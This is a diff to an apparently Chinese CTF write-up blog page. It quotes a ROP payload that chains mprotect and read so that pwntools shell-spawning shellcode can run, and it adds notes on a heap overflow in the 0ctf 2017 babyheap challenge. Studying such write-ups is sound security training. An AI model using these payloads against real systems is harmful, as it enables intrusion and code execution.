@@ -497,7 +497,10 @@ p.sendline(payload_sh)</code></pre>
 <p>payload = ‘A’ + 0x38 + p32(mprotect_addr)<br>payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)<br>payload += p32(read_addr) + p32(ret_addr2) + p32(0x0) + p32(mem_addr) +p32 (0x100)<br>payload += p32(mem_addr)</p>
 <p>然而在执行read函数时就可以输入shellcode,即payload2为:<br>payload_sh = asm(shellcraft.sh(),arch = ‘i386’, os = ‘linux’)</p>
 </blockquote>
-<h2 id="0x0C-babyheap-0ctf-2017">0x0C:babyheap_0ctf_2017<a class="post-anchor" href="#0x0C-babyheap-0ctf-2017"></a></h2>
+<h2 id="0x0C-babyheap-0ctf-2017">0x0C:babyheap_0ctf_2017<a class="post-anchor" href="#0x0C-babyheap-0ctf-2017"></a></h2><p>保护全开</p>
+<p>程序使用calloc进行堆的分配。calloc同malloc类似只是会将申请到的堆块内容清0。所以常规的unsorted bin信息泄露的方式不可行。</p>
+<p>Fill 函数传入的 size 可控 造成堆溢出。</p>
+
 
   
     <div class="post-reward">
